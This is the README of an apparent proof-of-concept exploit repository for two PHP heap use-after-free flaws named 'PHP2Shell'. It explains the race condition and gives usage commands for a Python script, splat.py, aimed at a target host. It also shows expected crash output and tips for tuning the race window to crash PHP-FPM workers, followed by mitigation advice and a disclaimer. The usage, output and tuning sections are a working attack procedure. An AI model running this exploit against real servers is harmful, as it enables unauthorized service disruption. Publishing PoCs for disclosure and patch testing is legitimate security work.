# CVE-2026-109618 / CVE-2026-109619 — PHP2Shell PoC

> **Critical PHP Heap Use-After-Free — CVSS 9.2**  
> Affects PHP 5.x through 8.x (PHP 7.4 is EOL — no patch will ever be released)

## Overview

**PHP2Shell** is the name given to two heap use-after-free vulnerabilities in PHP core
patched on October 21, 2026.

| CVE | Component | Trigger |
|-----|-----------|---------|
| CVE-2026-109618 | `session.upload_progress` handler (rfc1867) | Requires `session.upload_progress.enabled = On` (default since PHP 5.4) |
| CVE-2026-109619 | Multipart parser | Any `multipart/form-data` POST — no session required |

Both are rated **CVSS 9.2** and affect unauthenticated attackers on any PHP installation
serving multipart requests.

## How It Works

### Root Cause

The `rfc1867` upload-progress handler in `ext/session/session.c` caches raw C pointers
into the live session HashTable:

```c
/* session.c — simplified */
zend_string *key = zend_string_init(UPLOAD_PROGRESS_PREFIX, ...);
zend_hash_update(Z_ARRVAL_P(progress), key, &val);   // ← pointer cached
```

When a **concurrent request** with the same `PHPSESSID` calls `session_start()`,
the session module reinitializes — **freeing the old HashTable** — while the
upload-progress handler still holds raw pointers into it.

Any further `FILE_DATA` write events go through those **stale (dangling) pointers**
into freed memory: a classic heap use-after-free write primitive.

```
Thread A (upload)          Thread B (session reinit)
─────────────────          ──────────────────────────
chunk-1 → primes pointer   
                           session_start() →
                             ht_free(session_ht)   ← HashTable freed
chunk-2 → writes through
          dangling ptr     ← UAF write into freed memory
```

### CVE-2026-109619 — Multipart Parser

A second UAF sits in the multipart parser itself (`main/rfc1867.c`).
It fires for **every** `multipart/form-data` POST — session handling not required.
This makes it reachable against any PHP endpoint, including login forms,
file upload handlers, and REST APIs.

## PoC: Crash Demonstration

This PoC demonstrates the UAF write primitive. It sends the multipart upload in two
bursts with a timing gap, concurrently forcing a session reinit to free the HashTable
between the two bursts.

### Requirements

```
Python 3.6+  (stdlib only — no dependencies)
```

### Usage

```bash
python3 splat.py <host> <port> <path> [stall_seconds]

# HTTP
python3 splat.py target.example.com 80 /upload.php 0.35

# HTTPS (TLS auto-detected on port 443)
python3 splat.py target.example.com 443 /index.php 0.35
```

### Expected Output (vulnerable target)

```
============================================================
  CVE-2026-109618 — PHP2Shell UAF PoC
============================================================
  Target  : https://target.example.com:443/index.php
  TLS     : True
  Session : o7hdboj52ksh6ggf8g6c8uyd8m
  Stall   : 0.35s

[*] Fingerprinting target...
  HTTP/1.1 200 OK
  Server: openresty

[*] Starting UAF trigger sequence...
[*] Chunk-1 sent (8192 B) — session pointer now cached
[*] Firing concurrent reinit request (same PHPSESSID)...
[*] Stalling 0.35s for HashTable to be freed...
[*] Sending chunk-2 through stale pointer — UAF write triggered

[*] Response: HTTP/1.1 503 Service Unavailable
[+] Server-side error — crash / UAF likely triggered!
```

A `503` or socket timeout following a clean `200` on a normal GET confirms
the PHP-FPM worker crashed. The worker is automatically restarted by PHP-FPM,
so the service recovers on its own.

### Tuning the Stall

The race window depends on server load and PHP-FPM worker count. Try:

```bash
# Narrower window (faster servers)
python3 splat.py target.example.com 443 / 0.2

# Wider window (slower/loaded servers)
python3 splat.py target.example.com 443 / 0.5
```

## Affected Versions

| Branch | Vulnerable | Patched |
|--------|-----------|---------|
| PHP 8.3 | < 8.3.x+1 | 8.3.x+1 (2026-10-21) |
| PHP 8.2 | < 8.2.x+1 | 8.2.x+1 (2026-10-21) |
| PHP 8.1 | < 8.1.x+1 | 8.1.x+1 (2026-10-21) |
| PHP 7.4 | ALL | **EOL — no patch ever** |
| PHP 5.x | ALL | **EOL — no patch ever** |

## Mitigation

**Patch (preferred):** Upgrade to the October 21 2026 PHP releases.

**Temporary workarounds:**

```ini
; php.ini — disables CVE-2026-109618 vector only
session.upload_progress.enabled = Off
```

For CVE-2026-109619 (multipart parser), the only real fix is patching.
At the web server level, blocking `Content-Type: multipart/form-data` for
endpoints that don't need file uploads reduces attack surface but is not
a complete mitigation.

## Disclaimer

This PoC is published for **educational and authorized security testing** only.
Crash-testing a production server without written authorization is illegal in most jurisdictions.
The crash induced by this PoC causes a single PHP-FPM worker to die; PHP-FPM restarts it
automatically, so impact on a well-configured server is a brief worker-level disruption,
not a full outage.

## References

- [Sansec — PHP2Shell research](https://sansec.io/research/php2shell)
- [watchTowr — CVE-2026-109618 FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
- [SecurityWeek — Mass exploitation risk](https://www.securityweek.com/php2shell-mass-exploitation-looms-for-leaked-critical-php-flaws/)
- [Tenable — CVE-2026-109618](https://www.tenable.com/cve/CVE-2026-109618)
